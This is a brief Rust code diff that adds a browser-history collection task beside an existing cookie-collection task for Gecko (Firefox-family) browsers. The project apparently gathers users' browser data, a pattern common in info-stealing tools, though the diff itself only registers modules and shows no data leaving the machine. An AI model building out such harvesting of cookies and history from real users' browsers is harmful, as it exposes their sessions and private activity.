@@ -1,4 +1,5 @@
 mod cookies;
+mod history;
 
 use crate::vec;
 use alloc::sync::Arc;
@@ -7,6 +8,7 @@ use core::ops::Deref;
 use tasks::{composite_task, CompositeTask, Task};
 use utils::path::Path;
 use crate::gecko::cookies::CookiesTask;
+use crate::gecko::history::HistoryTask;
 
 pub struct GeckoTask<'a> {
     tasks: Vec<(Arc<GeckoBrowserData<'a>>, CompositeTask)>
@@ -28,6 +30,7 @@ impl GeckoTask<'_> {
                 browser.clone(),
                 composite_task!(
                     CookiesTask::new(browser.clone()),
+                    HistoryTask::new(browser.clone()),
                 )
             ))
         }
